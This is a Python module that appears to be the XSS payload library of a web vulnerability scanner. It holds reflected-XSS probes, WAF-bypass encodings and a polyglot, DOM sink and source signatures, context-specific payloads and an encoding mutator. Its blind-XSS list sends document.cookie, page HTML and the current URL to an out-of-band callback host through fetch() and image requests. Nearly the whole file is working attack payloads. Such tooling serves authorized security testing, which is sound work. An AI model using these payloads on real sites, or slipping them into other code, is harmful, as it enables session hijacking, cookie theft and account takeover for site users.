"""
XSS payload library.
Covers reflected, DOM-based (signature), stored / blind (OOB callback).
"""

from __future__ import annotations
import html
import urllib.parse
import base64


# ── Basic reflected XSS probes ────────────────────────────────────────────────

REFLECTED_PAYLOADS: list[str] = [
    # Classic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    # Attribute break-out
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "' onfocus='alert(1)' autofocus='",
    # Tag injection
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    # Script injection without quotes
    "<script>alert`1`</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    # HTML5 vectors
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    "<object data='javascript:alert(1)'>",
    # Expression / style
    "<div style=\"background:url('javascript:alert(1)')\">",
    # Closing context variations
    "</script><script>alert(1)</script>",
    "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
]

# ── WAF-bypass variants ───────────────────────────────────────────────────────

BYPASS_PAYLOADS: list[str] = [
    # Mixed case
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    # Null bytes (some old parsers)
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    # Tab/newline in tag
    "<scr\tipt>alert(1)</scr\tipt>",
    "<scr\nipt>alert(1)</scr\nipt>",
    # Double-encoding
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # HTML entities
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # Angular / template injection probe (if angular is detected)
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    # SVG CDATA bypass
    "<svg><script>alert&#40;1&#41;</script>",
    "<svg><script>//&NewLine;alert(1)</script>",
    # Polyglot
    "javascript:/*--></title></style></textarea></script></xmp>"
    "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
]

# ── DOM-based XSS detection signatures ───────────────────────────────────────

DOM_SINKS: list[str] = [
    "document.write(",
    "document.writeln(",
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "location.href",
    "location.replace(",
    "location.assign(",
    "window.location",
    "document.domain",
    "document.URL",
    "document.referrer",
    "$.html(",
    "$()",
    "jQuery(",
]

DOM_SOURCES: list[str] = [
    "location.hash",
    "location.search",
    "location.href",
    "document.URL",
    "document.referrer",
    "window.name",
    "history.pushState",
]

# ── Blind XSS (OOB) payloads  — %OOB_URL% is replaced at runtime ─────────────

BLIND_XSS_PAYLOADS: list[str] = [
    "<script src='%OOB_URL%/blind.js'></script>",
    "\"><script src='%OOB_URL%/blind.js'></script>",
    "'><script src='%OOB_URL%/blind.js'></script>",
    "<img src='%OOB_URL%/img' onerror=\"this.src='%OOB_URL%/?c='+document.cookie\">",
    "<script>new Image().src='%OOB_URL%/?url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie)</script>",
    "\"><img src=x onerror=\"fetch('%OOB_URL%/?d='+btoa(document.body.innerHTML))\">",
    "<svg onload=\"fetch('%OOB_URL%/?h='+document.domain)\">",
]


def get_blind_payloads(oob_url: str) -> list[str]:
    return [p.replace("%OOB_URL%", oob_url.rstrip("/")) for p in BLIND_XSS_PAYLOADS]


# ── Detection marker ──────────────────────────────────────────────────────────

MARKER = "xss_probe_8675309"   # unique string injected to detect reflection

MARKER_PAYLOAD = f"<z0m>{MARKER}</z0m>"


# ── Context-aware payload selection ──────────────────────────────────────────

def payloads_for_context(context: str) -> list[str]:
    """
    Return payloads suitable for a given reflection context.

    context: 'html' | 'attribute' | 'script' | 'url' | 'css' | 'unknown'
    """
    ctx = context.lower()
    if ctx == "attribute":
        return [
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            "\" onfocus=\"alert(1)\" autofocus=\"",
            "\" onload=\"alert(1)",
        ]
    elif ctx == "script":
        return [
            "';alert(1);//",
            "\";alert(1);//",
            "</script><script>alert(1)</script>",
            "alert(1)",
        ]
    elif ctx == "url":
        return [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
    elif ctx == "css":
        return [
            "expression(alert(1))",
            "url('javascript:alert(1)')",
        ]
    else:   # html / unknown
        return REFLECTED_PAYLOADS[:10]


def mutate_xss(payload: str) -> list[str]:
    """Generate encoding variants of an XSS payload."""
    variants = [payload]

    # URL encode
    variants.append(urllib.parse.quote(payload))

    # HTML entity encode <, >
    variants.append(html.escape(payload))

    # Base64 (for data: URIs)
    b64 = base64.b64encode(payload.encode()).decode()
    variants.append(f"data:text/html;base64,{b64}")

    return list(dict.fromkeys(variants))


def get_all_xss_payloads() -> list[str]:
    return list(dict.fromkeys(REFLECTED_PAYLOADS + BYPASS_PAYLOADS))
